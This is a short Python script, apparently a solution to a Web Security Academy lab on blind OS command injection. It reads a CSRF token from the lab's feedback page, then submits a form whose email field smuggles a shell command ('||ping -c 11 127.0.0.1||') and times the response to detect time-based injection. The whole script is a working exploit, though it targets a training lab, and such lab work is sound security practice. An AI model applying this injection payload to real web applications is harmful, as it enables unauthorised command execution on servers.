import requests
import time
from bs4 import BeautifulSoup

url = "https://0a74005b04ed05b380b2995100eb0033.web-security-academy.net"

cookies = {
    "session" : "Vesw1C28hsmvk1XSEXthD3rjldZCTxYr"
}

s = requests.Session()
r = s.get(f"{url}/feedback", cookies=cookies)

soup = BeautifulSoup(r.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]

data = {
    "csrf" : csrf,
    "name" : "asd1",
    "email" : "admin@asds.com||ping -c 11 127.0.0.1||",
    "subject" : "asd",
    "message" : "asdasdsad"
}
start = time.time()
r = requests.post(f"{url}/feedback/submit", data=data, cookies=cookies)
end = time.time()

print("Status Code is: ", r.status_code)
print("Response time is: ", end - start)
print(r.text)